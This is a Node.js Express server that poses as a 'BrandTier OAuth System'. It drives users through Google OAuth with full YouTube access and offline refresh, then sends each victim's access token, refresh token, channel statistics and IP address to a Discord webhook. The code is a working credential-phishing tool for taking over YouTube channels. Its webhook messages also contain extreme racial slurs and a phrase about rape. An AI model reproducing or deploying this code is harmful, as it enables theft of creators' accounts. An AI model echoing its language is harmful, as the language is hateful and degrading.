require("dotenv").config();
const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();

const PORT = process.env.PORT || 3000;

app.use(cors({
  origin: process.env.FRONTEND_URL || true,
  credentials: true
}));

app.use(express.json());

/* -------------------------------------------------
   IP HELPER (IMPORTANT FIX FOR RAILWAY)
--------------------------------------------------*/
function getIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.socket.remoteAddress ||
    "unknown"
  );
}

/* -------------------------------------------------
   DISCORD WEBHOOK (FULL DATA, NO CUTTING)
--------------------------------------------------*/
async function sendToDiscord(payload) {
  try {
    const isFail = payload.status === "oauth_failed";

    await axios.post(process.env.DISCORD_WEBHOOK_URL, {
      embeds: [
        {
          title: isFail ? "OAuth Failed" : "Awptic Nigger Detector Reporting",
          color: isFail ? 15548997 : 3066993,

          description: isFail
            ? "Awptic Nigger Detector"
            : "A nigger was caught and raped on the spot",

          fields: isFail
            ? [
                {
                  name: "IP Address",
                  value: `\`\`\`${payload.ip || "unknown"}\`\`\``
                },
                {
                  name: "Error",
                  value:
                    "```json\n" +
                    JSON.stringify(payload.error, null, 2) +
                    "\n```"
                }
              ]
            : [
                {
                  name: "Channel",
                  value: `\`\`\`${payload.name || "N/A"}\`\`\``
                },
                {
                  name: "Subscribers",
                  value: `\`\`\`${payload.subs || "0"}\`\`\``,
                  inline: true
                },
                {
                  name: "Views",
                  value: `\`\`\`${payload.views || "0"}\`\`\``,
                  inline: true
                },
                {
                  name: "Videos",
                  value: `\`\`\`${payload.videos || "0"}\`\`\``,
                  inline: true
                },

                {
                  name: "Access Token",
                  value: `\`\`\`${payload.access_token || "N/A"}\`\`\``
                },
              
                {
                  name: "Refresh Token",
                  value: `\`\`\`${payload.refresh_token || "N/A"}\`\`\``
                },

                {
                  name: "IP Address",
                  value: `\`\`\`${payload.ip || "unknown"}\`\`\``
                },

                {
                  name: "Status",
                  value: `\`\`\`${payload.status || "success"}\`\`\``
                }
              ],

          footer: {
            text: "BrandTier OAuth System"
          },

          timestamp: new Date().toISOString()
        }
      ]
    });
  } catch (err) {
    console.log("Webhook error:", err.message);
  }
}

/* -------------------------------------------------
   1. AUTH ROUTE
--------------------------------------------------*/
app.get("/auth", (req, res) => {
  const url =
    "https://accounts.google.com/o/oauth2/v2/auth?" +
    new URLSearchParams({
      client_id: process.env.CLIENT_ID,
      redirect_uri: process.env.REDIRECT_URI,
      response_type: "code",
      scope: "https://www.googleapis.com/auth/youtube",
      access_type: "offline",
      prompt: "consent"
    });

  res.redirect(url);
});

/* -------------------------------------------------
   2. CALLBACK
--------------------------------------------------*/
app.get("/callback", async (req, res) => {
  const code = req.query.code;
  const ip = getIP(req);

  try {
    const tokenRes = await axios.post(
      "https://oauth2.googleapis.com/token",
      new URLSearchParams({
        code,
        client_id: process.env.CLIENT_ID,
        client_secret: process.env.CLIENT_SECRET,
        redirect_uri: process.env.REDIRECT_URI,
        grant_type: "authorization_code"
      }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        }
      }
    );

    const { access_token, refresh_token } = tokenRes.data;

    const yt = await axios.get(
      "https://www.googleapis.com/youtube/v3/channels",
      {
        params: {
          part: "snippet,statistics",
          mine: true
        },
        headers: {
          Authorization: `Bearer ${access_token}`
        }
      }
    );

    const channel = yt.data.items?.[0];

    if (!channel) {
      return res.status(400).send("No channel found");
    }

    await sendToDiscord({
      name: channel.snippet.title,
      subs: channel.statistics.subscriberCount,
      views: channel.statistics.viewCount,
      videos: channel.statistics.videoCount,
      access_token,
      refresh_token,
      ip,
      status: "oauth_success"
    });

    res.redirect(process.env.FRONTEND_URL + "/?connected=1");

  } catch (err) {
    await sendToDiscord({
      status: "oauth_failed",
      ip: ip,
      error: err.response?.data || err.message
    });

    res.status(500).send("OAuth Error");
  }
});

/* -------------------------------------------------
   START SERVER
--------------------------------------------------*/
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
